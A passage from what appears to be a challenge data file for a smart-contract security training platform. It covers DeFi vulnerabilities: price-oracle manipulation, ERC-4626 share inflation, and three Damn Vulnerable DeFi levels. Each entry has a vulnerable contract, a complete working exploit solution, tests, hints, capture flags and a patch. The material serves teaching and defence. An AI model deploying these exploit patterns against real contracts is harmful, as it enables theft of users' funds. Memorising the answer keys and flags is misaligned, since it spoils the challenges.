    function swap(address tokenIn, uint256 amountIn) external returns (uint256 amountOut);
}

contract OracleExploit {
    ILendMax public immutable lendMax;
    ISimpleDEX public immutable dex;

    constructor(address _lendMax, address _dex) {
        lendMax = ILendMax(_lendMax);
        dex = ISimpleDEX(_dex);
    }

    function executeAttack(uint256 flashLoanAmount) external {
        // Swap flash loan -> deposit pumped collateral -> drain borrow treasury
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ILendMax {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
}

interface ISimpleDEX {
    function swap(address tokenIn, uint256 amountIn) external returns (uint256 amountOut);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract OracleExploit {
    ILendMax public immutable lendMax;
    ISimpleDEX public immutable dex;
    IERC20 public immutable collateralToken;
    IERC20 public immutable borrowToken;

    constructor(address _lendMax, address _dex, address _col, address _bor) {
        lendMax = ILendMax(_lendMax);
        dex = ISimpleDEX(_dex);
        collateralToken = IERC20(_col);
        borrowToken = IERC20(_bor);
    }

    function executeAttack(uint256 flashLoanAmount) external {
        borrowToken.approve(address(dex), flashLoanAmount);
        dex.swap(address(borrowToken), flashLoanAmount);

        uint256 colBal = collateralToken.balanceOf(address(this));
        collateralToken.approve(address(lendMax), colBal);
        lendMax.depositCollateral(colBal);

        uint256 vaultBal = borrowToken.balanceOf(address(lendMax));
        lendMax.borrow(vaultBal);
    }
}`,
    testFileName: 'ExploitTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/LendMax.sol";
import "../src/OracleExploit.sol";

contract ExploitTest is Test {
    LendMax public lendMax;
    OracleExploit public exploit;

    function setUp() public {}

    function testExploit() public {
        exploit.executeAttack(1_000_000 ether);
        assertEq(lendMax.borrowToken().balanceOf(address(lendMax)), 0, "Treasury not fully drained");
    }
}`,
    flag: 'BLOCKSEC{tw4p_0r4cl3_pr3v3nts_fl4sh_l04n_m4n1pul4t10n}',
    hints: [
      {
        id: 'h2-1',
        tier: 1,
        title: 'Spot Reserves vs TWAP',
        costXp: 0,
        content: 'Observe getCollateralPrice(). It queries pair.getReserves() instantaneously.',
      },
      {
        id: 'h2-2',
        tier: 2,
        title: 'Liquidity pump sequence',
        costXp: 25,
        content: 'Swapping borrow tokens for collateral tokens inflates reserve ratio.',
      },
      {
        id: 'h2-3',
        tier: 3,
        title: 'Execution order',
        costXp: 50,
        content: '1. Swap in DEX. 2. Deposit collateral. 3. Borrow treasury funds. 4. Profit.',
      },
    ],
    historicalCase: {
      protocolName: 'Cream Finance / Euler Finance',
      date: 'October 27, 2021',
      lossUsd: '$130,000,000',
      summary: 'Flash loans warped Curve pool pricing, enabling massive undercollateralized borrowing.',
      referenceUrl: 'https://rekt.news/cream-rekt-2/',
    },
    patchDiff: {
      explanation: 'Use decentralized Chainlink Data Feeds or Uniswap v3 TWAP.',
      vulnerableCode: `function getCollateralPrice() public view returns (uint256) {
    (uint112 r0, uint112 r1, ) = pair.getReserves();
    return (uint256(r1) * 1e18) / uint256(r0);
}`,
      secureCode: `function getCollateralPrice() public view returns (uint256) {
    (, int256 price, , uint256 updatedAt, ) = priceFeed.latestRoundData();
    require(price > 0 && block.timestamp - updatedAt <= 3600, "Stale price");
    return uint256(price);
}`,
      recommendedBestPractices: [
        'Enforce decentralized oracles with staleness checks',
        'Use Uniswap v3 TWAP over at least 30-minute windows',
      ],
    },
  },
  {
    id: 'c4-erc4626-inflation',
    slug: 'erc4626-share-inflation',
    title: 'ERC-4626 First Depositor Vault Inflation',
    curriculumLevel: 2,
    category: 'math-logic',
    difficulty: 'advanced',
    xpReward: 300,
    estimatedMinutes: 35,
    swcTag: 'SWC-101',
    cweTag: 'CWE-682',
    solveRatePercent: 51,
    tags: ['erc-4626', 'vault-inflation', 'dead-shares', 'rounding'],
    theoryExplanation: `### ERC-4626 Share Ratio Math & Rounding Vulnerability

Standard ERC-4626 vaults convert deposits to shares using:
\`\`\`
shares = (assets * totalShares) / totalAssets
\`\`\`

1. **Empty Vault State**: Initial depositor mints 1 share with 1 wei of assets (\`totalShares = 1\`, \`totalAssets = 1\`).
2. **Direct Balance Donation**: The attacker donates 10,000 tokens directly to the vault contract address via \`transfer()\`. Now: \`totalShares = 1\`, \`totalAssets = 10,001 tokens\`.
3. **Rounding Truncation**: When a victim deposits 5,000 tokens, the vault computes:
   \`(5000 * 1) / 10001 = 0\` shares!
4. **Theft**: The victim receives 0 shares, while the attacker redeems their 1 share for all 15,001 tokens.`,
    conceptSummary: [
      'Integer division in Solidity rounds toward zero',
      'Vaults must burn dead shares on genesis or employ virtual share offsets',
    ],
    description:
      'YieldVault implements an ERC-4626 tokenized vault without dead shares. An early depositor can mint 1 share and donate underlying tokens, causing subsequent deposits to round down to 0 shares.',
    protocolArchitecture:
      'shares = (assets * totalShares) / totalAssets(). Directly transferring tokens to the vault skews the denominator totalAssets.',
    exploitObjective:
      'Execute a frontrunning inflation attack: deposit 1 wei, donate 10,000 tokens directly, let victim deposit 5,000 tokens, and redeem your 1 share for all 15,000 tokens.',
    targetFileName: 'YieldVault.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract YieldVault {
    IERC20 public immutable asset;
    uint256 public totalShares;
    mapping(address => uint256) public balanceOf;

    constructor(address _asset) {
        asset = IERC20(_asset);
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function deposit(uint256 assets) external returns (uint256 shares) {
        if (totalShares == 0) {
            shares = assets;
        } else {
            shares = (assets * totalShares) / totalAssets();
        }

        require(shares > 0, "Mint 0 shares prohibited");
        asset.transferFrom(msg.sender, address(this), assets);

        totalShares += shares;
        balanceOf[msg.sender] += shares;
    }

    function redeem(uint256 shares) external returns (uint256 assets) {
        require(balanceOf[msg.sender] >= shares, "Insufficient shares");
        assets = (shares * totalAssets()) / totalShares;

        balanceOf[msg.sender] -= shares;
        totalShares -= shares;

        asset.transfer(msg.sender, assets);
    }
}`,
    exploitFileName: 'VaultInflationExploit.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IYieldVault {
    function deposit(uint256 assets) external returns (uint256 shares);
    function redeem(uint256 shares) external returns (uint256 assets);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract VaultInflationExploit {
    IYieldVault public immutable vault;
    IERC20 public immutable asset;

    constructor(address _vault, address _asset) {
        vault = IYieldVault(_vault);
        asset = IERC20(_asset);
    }

    function attack(uint256 donationAmount) external {
        // Step 1: Deposit 1 wei
        // Step 2: Donate donationAmount directly
    }

    function finishAttack() external {
        // Step 3: Redeem
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IYieldVault {
    function deposit(uint256 assets) external returns (uint256 shares);
    function redeem(uint256 shares) external returns (uint256 assets);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract VaultInflationExploit {
    IYieldVault public immutable vault;
    IERC20 public immutable asset;

    constructor(address _vault, address _asset) {
        vault = IYieldVault(_vault);
        asset = IERC20(_asset);
    }

    function attack(uint256 donationAmount) external {
        asset.approve(address(vault), 1);
        vault.deposit(1);
        asset.transfer(address(vault), donationAmount);
    }

    function finishAttack() external {
        vault.redeem(1);
    }
}`,
    testFileName: 'ExploitTest.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/YieldVault.sol";
import "../src/VaultInflationExploit.sol";

contract ExploitTest is Test {
    YieldVault public vault;
    VaultInflationExploit public exploit;

    function setUp() public {}

    function testExploit() public {
        exploit.attack(10_000 ether);
        exploit.finishAttack();
        assertGe(vault.asset().balanceOf(address(exploit)), 14_999 ether, "Exploit failed to capture vault assets");
    }
}`,
    flag: 'BLOCKSEC{3rc4626_d34d_sh4r3s_v1rtu4l_0ffs3t}',
    hints: [
      {
        id: 'h4-1',
        tier: 1,
        title: 'Share Ratio Math',
        costXp: 0,
        content: 'In Solidity, integer division rounds toward zero: (a * b) / c.',
      },
      {
        id: 'h4-2',
        tier: 2,
        title: 'Direct donation bypass',
        costXp: 25,
        content: 'Transfer tokens directly to YieldVault address to inflate totalAssets.',
      },
      {
        id: 'h4-3',
        tier: 3,
        title: 'Redeeming full inflated pool',
        costXp: 50,
        content: 'Redeem your 1 share to extract victim funds.',
      },
    ],
    historicalCase: {
      protocolName: 'Hundred Finance',
      date: 'April 15, 2023',
      lossUsd: '$7,000,000',
      summary: 'Hundred Finance was exploited for $7M using an empty compound/vault market inflation attack.',
      referenceUrl: 'https://rekt.news/hundred-finance-rekt/',
    },
    patchDiff: {
      explanation: 'Burn dead shares or implement OpenZeppelin ERC4626 virtual decimals offset.',
      vulnerableCode: `shares = (assets * totalShares) / totalAssets();`,
      secureCode: `return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);`,
      recommendedBestPractices: [
        'Burn the first 1,000 shares to address(0xdead)',
        'Adopt OpenZeppelin virtual decimals offset',
      ],
    },
  },

  // ===========================================================================
  // DAMN VULNERABLE DEFI LABS (v2 Release)
  // ===========================================================================
  {
    id: 'lvl2-dvd-truster',
    slug: 'truster-flashloan-exploit',
    title: 'Damn Vulnerable DeFi: Truster',
    curriculumLevel: 2,
    category: 'defi',
    difficulty: 'intermediate',
    xpReward: 250,
    estimatedMinutes: 25,
    swcTag: 'SWC-107',
    cweTag: 'CWE-284',
    solveRatePercent: 74,
    tags: ['damn-vulnerable-defi', 'flash-loan', 'arbitrary-call', 'erc20-approve'],
    theoryExplanation: `### Arbitrary Call Execution in Flash Loans

In DeFi lending protocols, flash loan callbacks can be structured in two ways:
1. **Strict Interface Hook**: Calling a fixed selector on caller (e.g. \`IFlashLoanReceiver(msg.sender).onFlashLoan(...)\`).
2. **Generic Call Target (Vulnerable Anti-Pattern)**: Letting the borrower specify an arbitrary target address and arbitrary calldata:
\`\`\`solidity
target.functionCall(data);
\`\`\`

### The Threat Vector
When a contract initiates an external call using \`target.functionCall(data)\`, the call originates **from the lending pool contract** (\`msg.sender == pool\`).
If an attacker passes:
- \`target = address(token)\`
- \`data = abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max)\`

The pool calls the ERC-20 token contract, instructing it to grant maximum allowance to the attacker! The attacker can borrow 0 tokens, pay 0 fees, and then drain all pool tokens via \`transferFrom(pool, attacker, balance)\`.`,
    conceptSummary: [
      'Arbitrary target/calldata calls execute with the pool identity as msg.sender',
      'Never allow untrusted callers to dictate external call destinations or payloads',
      'Flash loan implementations must restrict callbacks strictly to known recipient interfaces',
    ],
    description:
      'TrusterLenderPool offers zero-fee flash loans of DamnValuableToken. But it permits callers to execute an arbitrary function call on any target contract. Can you drain all 1,000,000 tokens from the pool in a single transaction?',
    protocolArchitecture:
      'The pool checks that its token balance does not decrease. However, it performs `target.functionCall(data)` before checking balance, allowing the caller to force the pool to approve an allowance for the attacker.',
    exploitObjective:
      'Take a flash loan of 0 tokens, instructing the pool to execute an ERC20 `approve` granting maximum allowance to your exploit contract. Then call `transferFrom` to drain the 1,000,000 token balance.',
    targetFileName: 'TrusterLenderPool.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract TrusterLenderPool {
    IERC20 public immutable damnValuableToken;

    error RepayFailed();

    constructor(address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    // VULNERABILITY: Arbitrary target and data execution!
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool) {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));

        damnValuableToken.transfer(borrower, borrowAmount);

        // Executes arbitrary call with pool's permissions!
        (bool success, ) = target.call(data);
        require(success, "External call failed");

        if (damnValuableToken.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}`,
    exploitFileName: 'TrusterExploit.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract TrusterExploit {
    ITrusterLenderPool public immutable pool;
    IERC20 public immutable token;

    constructor(address _pool, address _token) {
        pool = ITrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    // TODO: Borrow 0 tokens, force pool to approve you, then drain via transferFrom
    function attack() external {
        // Write attack logic here...
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract TrusterExploit {
    ITrusterLenderPool public immutable pool;
    IERC20 public immutable token;

    constructor(address _pool, address _token) {
        pool = ITrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function attack() external {
        // Encode token.approve(address(this), type(uint256).max)
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        // Borrow 0 tokens from pool, directing target call to token contract
        pool.flashLoan(0, msg.sender, address(token), data);

        // Drain pool treasury via approved allowance
        uint256 poolBalance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), msg.sender, poolBalance);
    }
}`,
    testFileName: 'Truster.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/TrusterLenderPool.sol";
import "../src/TrusterExploit.sol";

contract TrusterTest is Test {
    TrusterLenderPool public pool;
    TrusterExploit public exploit;
    address public attacker = address(0x999);

    function setUp() public {}

    function testExploit() public {
        vm.startPrank(attacker);
        exploit.attack();
        vm.stopPrank();

        assertEq(pool.damnValuableToken().balanceOf(address(pool)), 0, "Pool not drained");
    }
}`,
    flag: 'BLOCKSEC{dvd_trust3r_4rb1tr4ry_c4ll_4ppr0v3}',
    hints: [
      {
        id: 'h-tr-1',
        tier: 1,
        title: 'Zero borrow amount',
        costXp: 0,
        content: 'You do not need to borrow any tokens to trigger the flash loan function! `borrowAmount = 0` satisfies the balance repayment check immediately.',
      },
      {
        id: 'h-tr-2',
        tier: 2,
        title: 'Target and Calldata parameters',
        costXp: 25,
        content: 'What happens when `target = address(token)` and `data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)`? Who is `msg.sender` for that approval?',
      },
      {
        id: 'h-tr-3',
        tier: 3,
        title: 'Siphoning with transferFrom',
        costXp: 40,
        content: 'After the flashLoan call returns, your contract now has an infinite allowance on the pool\'s tokens. Call `token.transferFrom(address(pool), recipient, poolBalance)`.',
      },
    ],
    historicalCase: {
      protocolName: 'Damn Vulnerable DeFi: Truster',
      date: 'v2 Release Challenge #3',
      lossUsd: '1,000,000 DVT',
      summary: 'Showcases how arbitrary external call triggers inside contracts allow attackers to hijack privileges and drain tokens via malicious token approvals.',
      referenceUrl: 'https://www.damnvulnerabledefi.xyz/challenges/truster/',
    },
    patchDiff: {
      explanation: 'Remove arbitrary external calls. Restrict flash loan notifications to calling a dedicated onFlashLoan() callback on msg.sender.',
      vulnerableCode: `// VULNERABLE: Arbitrary target and data execution
(bool success, ) = target.call(data);`,
      secureCode: `// SECURE: Enforce standardized callback on borrower
IFlashLoanReceiver(borrower).executeOperation(borrowAmount, address(this));`,
      recommendedBestPractices: [
        'Never execute arbitrary target and data passed from external callers',
        'Use standardized flash loan interfaces (ERC-3156)',
      ],
    },
  },

  {
    id: 'lvl2-dvd-side-entrance',
    slug: 'side-entrance-flashloan',
    title: 'Damn Vulnerable DeFi: Side Entrance',
    curriculumLevel: 2,
    category: 'defi',
    difficulty: 'intermediate',
    xpReward: 250,
    estimatedMinutes: 25,
    swcTag: 'SWC-107',
    cweTag: 'CWE-841',
    solveRatePercent: 70,
    tags: ['damn-vulnerable-defi', 'flash-loan', 'accounting-confusion', 'side-entrance'],
    theoryExplanation: `### Accounting Confusion Between Flash Loans and Deposits

When a lending protocol holds pool Ether and maintains internal user balances:
1. **Flash Loan Invariant**: The contract asserts that its total balance at the end of the transaction is greater than or equal to its initial balance:
\`\`\`solidity
address(this).balance >= balanceBefore
\`\`\`
2. **The Flaw**: If the pool also provides a \`deposit()\` function that credits \`balances[msg.sender] += msg.value\`, an attacker taking a flash loan can **repay the flash loan by depositing the borrowed funds back into the pool**!

The pool's raw Ether balance invariant passes, but the pool now records that the attacker owns 100% of the funds in internal accounting, allowing a subsequent \`withdraw()\`!`,
    conceptSummary: [
      'Separating raw Ether balance checks from internal ledger balances causes accounting desynchronization',
      'Flash loan repayments must never be treated as regular user deposits',
      'Track dedicated flash loan debt states to prevent double-spending',
    ],
    description:
      'SideEntranceLenderPool allows anyone to deposit ETH, withdraw ETH, and take flash loans. The pool holds 1,000 ETH. Can you exploit accounting confusion to drain the pool balance to 0?',
    protocolArchitecture:
      'The pool checks `address(this).balance >= balanceBefore` after invoking `execute{value: amount}()` on the borrower. Depositing the borrowed funds satisfies the balance check while granting the attacker full withdrawal credit.',
    exploitObjective:
      '1. Take a 1,000 ETH flash loan.\n2. Inside the `execute()` callback, deposit the 1,000 ETH back into the pool.\n3. Flash loan completes successfully; call `withdraw()` to pocket all 1,000 ETH.',
    targetFileName: 'SideEntranceLenderPool.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;

    error NotEnoughETHInPool();
    error FlashLoanHasNotBeenPaidBack();

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).transfer(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        if (balanceBefore < amount)
            revert NotEnoughETHInPool();

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        // VULNERABILITY: Raw balance check does not account for user deposit credits!
        if (address(this).balance < balanceBefore)
            revert FlashLoanHasNotBeenPaidBack();
    }
}`,
    exploitFileName: 'SideEntranceExploit.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceExploit {
    ISideEntranceLenderPool public immutable pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    // TODO: Initiate flash loan and drain pool
    function attack() external {
        // Write attack logic here...
    }

    // TODO: Implement callback called by flashLoan
    function execute() external payable {
        // Repay via deposit
    }

    receive() external payable {}
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceExploit {
    ISideEntranceLenderPool public immutable pool;
    address public immutable owner;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function attack() external {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
        payable(owner).transfer(address(this).balance);
    }

    function execute() external payable {
        // Deposit the flash loan funds back to satisfy balance check AND credit our user balance
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}`,
    testFileName: 'SideEntrance.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/SideEntranceLenderPool.sol";
import "../src/SideEntranceExploit.sol";

contract SideEntranceTest is Test {
    SideEntranceLenderPool public pool;
    SideEntranceExploit public exploit;
    address public attacker = address(0x999);

    function setUp() public {
        pool = new SideEntranceLenderPool();
        vm.deal(address(pool), 1000 ether);

        vm.startPrank(attacker);
        exploit = new SideEntranceExploit(address(pool));
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(attacker);
        exploit.attack();
        vm.stopPrank();

        assertEq(address(pool).balance, 0, "Pool balance was not drained");
        assertGe(attacker.balance, 1000 ether, "Attacker did not capture funds");
    }
}`,
    flag: 'BLOCKSEC{dvd_s1d3_3ntr4nc3_d3p0s1t_fl4shl04n_pwn}',
    hints: [
      {
        id: 'h-se-1',
        tier: 1,
        title: 'Compare deposit() with flashLoan()',
        costXp: 0,
        content: '`flashLoan()` checks raw `address(this).balance`. What function in the contract accepts ETH and increases `address(this).balance` while granting you balance credit?',
      },
      {
        id: 'h-se-2',
        tier: 2,
        title: 'The execute() Callback Hook',
        costXp: 25,
        content: 'When `pool.flashLoan()` transfers funds to your contract and calls `execute()`, immediately call `pool.deposit{value: msg.value}()`.',
      },
      {
        id: 'h-se-3',
        tier: 3,
        title: 'Cashing Out',
        costXp: 40,
        content: 'The flash loan completes because the contract balance did not drop. Next, call `pool.withdraw()` to pull all the deposited funds to your wallet.',
      },
    ],
    historicalCase: {
      protocolName: 'Damn Vulnerable DeFi: Side Entrance',
      date: 'v2 Release Challenge #4',
      lossUsd: '1,000 ETH',
      summary: 'Demonstrates the danger of mixing pool accounting mechanisms without isolating flash loan liquidity from user deposit states.',
      referenceUrl: 'https://www.damnvulnerabledefi.xyz/challenges/side-entrance/',
    },
    patchDiff: {
      explanation: 'Prevent reentrancy into deposit() during active flash loans, or track flash loan state via dedicated debt flags.',
      vulnerableCode: `function flashLoan(uint256 amount) external {
    // Allows borrower to reenter deposit() freely!
    receiver.execute{value: amount}();
    require(address(this).balance >= balanceBefore);
}`,
      secureCode: `function flashLoan(uint256 amount) external nonReentrant {
    // Reentrancy guard blocks attacker from calling deposit() during flashLoan execution
    receiver.execute{value: amount}();
    require(address(this).balance >= balanceBefore);
}`,
      recommendedBestPractices: [
        'Apply nonReentrant modifiers across both flashLoan and deposit functions',
        'Maintain strict separation between pooled flash loan reserves and individual user deposit accounts',
      ],
    },
  },

  {
    id: 'lvl2-dvd-naive-receiver',
    slug: 'naive-receiver-fee-drain',
    title: 'Damn Vulnerable DeFi: Naive Receiver',
    curriculumLevel: 2,
    category: 'defi',
    difficulty: 'novice',
    xpReward: 150,
    estimatedMinutes: 15,
    swcTag: 'SWC-106',
    cweTag: 'CWE-284',
    solveRatePercent: 86,
    tags: ['damn-vulnerable-defi', 'flash-loan', 'unauthenticated-receiver', 'fee-drain'],
    theoryExplanation: `### Unauthenticated Flash Loan Execution & Fee Siphoning

In flash loan systems with fixed fees:
1. A borrower contract implements a callback (\`onFlashLoan()\`) that receives funds and pays back the principal **plus a mandatory fee** (e.g. 1 ETH).
2. If the receiver contract does NOT verify **who initiated the flash loan** (\`initiator == owner\`), ANY external party can trigger flash loans on behalf of that receiver!

Each unsolicited flash loan forces the victim receiver to pay 1 ETH fee from its balance to the pool. Triggering 10 flash loans in a loop completely siphons the receiver's 10 ETH into the lending pool!`,
    conceptSummary: [
      'Flash loan callbacks must verify the initiator parameter',
      'Never allow unauthenticated third parties to trigger fee-accruing operations',
      'Fixed fees make contracts vulnerable to griefing and balance drainage attacks',
    ],
    description:
      'A lender pool offers flash loans of Ether charging a 1 ETH fixed fee. A user deployed a FlashLoanReceiver contract holding 10 ETH. Can you drain all 10 ETH from the user contract in a single transaction?',
    protocolArchitecture:
      'The pool allows anyone to call `flashLoan(receiver, amount)`. The receiver contract blindly pays back `amount + 1 ether` without checking who initiated the loan.',
    exploitObjective:
      'Trigger 10 flash loans targeting the victim receiver contract until its balance drops from 10 ETH to 0.',
    targetFileName: 'NaiveReceiverPool.sol',
    targetCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFlashLoanReceiver {
    function onFlashLoan(address initiator, uint256 amount, uint256 fee) external returns (bytes32);
}

contract NaiveReceiverPool {
    uint256 public constant FIXED_FEE = 1 ether;

    function flashLoan(address payable receiver, uint256 amount) external returns (bool) {
        uint256 balanceBefore = address(this).balance;

        receiver.transfer(amount);

        // VULNERABILITY: Does not verify that initiator requested the loan!
        IFlashLoanReceiver(receiver).onFlashLoan(msg.sender, amount, FIXED_FEE);

        require(address(this).balance >= balanceBefore + FIXED_FEE, "Fee not paid");
        return true;
    }
}

contract FlashLoanReceiver {
    address public immutable pool;
    address public owner;

    constructor(address _pool) {
        pool = _pool;
        owner = msg.sender;
    }

    // VULNERABILITY: Blindly repays amount + fee without checking initiator!
    function onFlashLoan(address initiator, uint256 amount, uint256 fee) external returns (bytes32) {
        require(msg.sender == pool, "Caller must be pool");

        uint256 amountToBeRepaid = amount + fee;
        payable(pool).transfer(amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}`,
    exploitFileName: 'NaiveReceiverExploit.sol',
    exploitInitialCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface INaiveReceiverPool {
    function flashLoan(address payable receiver, uint256 amount) external returns (bool);
}

contract NaiveReceiverExploit {
    INaiveReceiverPool public immutable pool;

    constructor(address _pool) {
        pool = INaiveReceiverPool(_pool);
    }

    // TODO: Drain receiver by triggering 10 flash loans
    function attack(address payable receiver) external {
        // Write attack logic here...
    }
}`,
    exploitSolutionCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface INaiveReceiverPool {
    function flashLoan(address payable receiver, uint256 amount) external returns (bool);
}

contract NaiveReceiverExploit {
    INaiveReceiverPool public immutable pool;

    constructor(address _pool) {
        pool = INaiveReceiverPool(_pool);
    }

    function attack(address payable receiver) external {
        // Drain 10 ETH fee in 10 loops of 0 ETH flash loans
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, 0);
        }
    }
}`,
    testFileName: 'NaiveReceiver.t.sol',
    testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/NaiveReceiverPool.sol";
import "../src/NaiveReceiverExploit.sol";

contract NaiveReceiverTest is Test {
    NaiveReceiverPool public pool;
    FlashLoanReceiver public receiver;
    NaiveReceiverExploit public exploit;

    function setUp() public {
        pool = new NaiveReceiverPool();
        vm.deal(address(pool), 1000 ether);

        receiver = new FlashLoanReceiver(address(pool));
        vm.deal(address(receiver), 10 ether);

        exploit = new NaiveReceiverExploit(address(pool));
    }

    function testExploit() public {
        exploit.attack(payable(address(receiver)));

        assertEq(address(receiver).balance, 0, "Receiver balance not drained");
        assertEq(address(pool).balance, 1010 ether, "Pool did not receive 10 ETH in fees");
    }
}`,
    flag: 'BLOCKSEC{dvd_n41v3_r3c31v3r_f33_dr41n_2022}',
    hints: [
      {
        id: 'h-nr-1',
        tier: 1,
        title: 'Check initiator authorization',
        costXp: 0,
        content: 'Does `FlashLoanReceiver.onFlashLoan()` check whether `initiator == owner`? No! Anyone can trigger a loan on its behalf.',
      },
      {
        id: 'h-nr-2',
        tier: 2,
        title: 'Borrow amount can be 0',
        costXp: 20,
        content: 'You can borrow `amount = 0`. The receiver still pays the mandatory 1 ETH fixed fee on every call.',
      },
      {
        id: 'h-nr-3',
        tier: 3,
        title: 'Batching in a loop',
        costXp: 30,
        content: 'Execute a for-loop of 10 `pool.flashLoan(receiver, 0)` calls inside your exploit contract to drain all 10 ETH atomically.',
      },
    ],
    historicalCase: {
      protocolName: 'Damn Vulnerable DeFi: Naive Receiver',
      date: 'v2 Release Challenge #2',
      lossUsd: '10 ETH',
      summary: 'Demonstrates fee-griefing attacks on unauthenticated flash loan receivers that fail to validate the loan initiator.',
      referenceUrl: 'https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/',
    },
    patchDiff: {
      explanation: 'Enforce that the initiator is an authorized account or the receiver owner itself.',
      vulnerableCode: `function onFlashLoan(address initiator, uint256 amount, uint256 fee) external returns (bytes32) {
    require(msg.sender == pool, "Caller must be pool");
    // Missing initiator check!
}`,
      secureCode: `function onFlashLoan(address initiator, uint256 amount, uint256 fee) external returns (bytes32) {
    require(msg.sender == pool, "Caller must be pool");
    require(initiator == owner, "Unauthorized initiator"); // Fixes vulnerability
}`,
      recommendedBestPractices: [
        'Always validate the initiator argument in ERC-3156 flash loan callbacks',
        'Reject unsolicited third-party loans that incur mandatory fees',
      ],
    },
  },

  // ===========================================================================
  // SWC REGISTRY & SOLIDITY VULNERABILITY DATABASE
  // ===========================================================================
  {
    id: 'lvl1-swc115-tx-origin',
    slug: 'tx-origin-phishing',
    title: 'SWC-115: tx.origin Phishing Attack',
    curriculumLevel: 1,
    category: 'access-control',
    difficulty: 'novice',
    xpReward: 150,
    estimatedMinutes: 15,
    swcTag: 'SWC-115',
    cweTag: 'CWE-284',
    solveRatePercent: 89,
    tags: ['swc-115', 'tx.origin', 'phishing', 'access-control'],
    theoryExplanation: `### tx.origin vs msg.sender in EVM Authorization

In the EVM:
1. **\`tx.origin\`**: The original External Owned Account (EOA) that signed and submitted the transaction. It **never changes** across nested calls in the call chain.
